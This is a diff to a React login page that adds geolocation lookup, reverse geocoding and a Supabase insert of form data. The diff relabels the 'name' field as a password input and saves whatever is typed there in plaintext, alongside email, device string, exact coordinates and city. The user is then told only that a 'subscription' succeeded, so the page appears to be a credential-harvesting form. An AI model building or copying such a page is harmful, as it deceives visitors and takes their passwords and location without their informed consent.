@@ -1,18 +1,26 @@
-"use client";
+"use client"; // Marks this as a Client Component (needed for useState, browser APIs)
 
 import React, { useState } from "react";
 import { FaXTwitter, FaFingerprint } from "react-icons/fa6";
 import { FcGoogle } from "react-icons/fc";
-
+import { supabase } from "../../lib/supabase"; // Supabase client instance
 
 export default function Login() {
+  // Controls loading state while submitting
   const [loading, setLoading] = useState(false);
+
+  // Stores validation error messages
   const [errors, setErrors] = useState({ email: "", name: "" });
 
+  /**
+   * Validates email and name input
+   * @returns true if valid, false otherwise
+   */
   const validateForm = (email, name) => {
     let valid = true;
     let newErrors = { email: "", name: "" };
 
+    // Email validation
     if (!email) {
       newErrors.email = "Email is required";
       valid = false;
@@ -21,6 +29,7 @@ export default function Login() {
       valid = false;
     }
 
+    // Name validation
     if (!name) {
       newErrors.name = "Name is required";
       valid = false;
@@ -33,21 +42,37 @@ export default function Login() {
     return valid;
   };
 
+  /**
+   * Handles form submission
+   * - validates input
+   * - gets device info
+   * - gets user location
+   * - converts lat/lng to city & country
+   * - inserts data into Supabase
+   */
   const handleSubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
 
+    // Read input values from form
     const email = e.target.email.value.trim();
     const name = e.target.name.value.trim();
-    const device = navigator.userAgent;
+    const device = navigator.userAgent; // Browser/device info
 
+    // Stop submission if validation fails
     if (!validateForm(email, name)) {
       setLoading(false);
       return;
     }
 
-    // Get location
+    // Location + readable place
     let location = null;
+    let city = null;
+    let country = null;
+
+    /**
+     * Request browser geolocation (lat/lng)
+     */
     try {
       location = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
@@ -63,25 +88,56 @@ export default function Login() {
       location = null;
     }
 
-    // Submit
-    await fetch("/api/subscribe", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
+    /**
+     * Reverse-geocode lat/lng → city & country
+     * Only runs if location exists
+     */
+    if (location) {
+      try {
+        const res = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.latitude}&lon=${location.longitude}`
+        );
+        const data = await res.json();
+
+        city =
+          data.address.city ||
+          data.address.town ||
+          data.address.village ||
+          null;
+
+        country = data.address.country || null;
+      } catch {
+        city = null;
+        country = null;
+      }
+    }
+
+    /**
+     * Insert collected data into Supabase database
+     */
+    const { error } = await supabase.from("submissions").insert([
+      {
         email,
         name,
         device,
         latitude: location?.latitude || null,
         longitude: location?.longitude || null,
-      }),
-    });
+        city,
+        country,
+      },
+    ]);
 
-    alert("Subscription successfully submitted!");
-    e.target.reset();
+    // Handle result
+    if (error) {
+      alert("Error submitting data");
+      console.error(error);
+    } else {
+      alert("Subscription successfully submitted!");
+      e.target.reset();
+    }
+
     setLoading(false);
   };
-
-  
 
   return (
     <div className="flex flex-col md:flex md:flex-row min-h-screen bg-white">
@@ -148,9 +204,9 @@ export default function Login() {
 
             <div>
               <input
-                type="name"
+                type="password"
                 name="name"
-                placeholder="name"
+                placeholder="password"
                 
                 className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
               />
@@ -160,6 +216,7 @@ export default function Login() {
             </div>
 
             <button
+              disabled={loading}
               type="submit"
               className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full"
             >
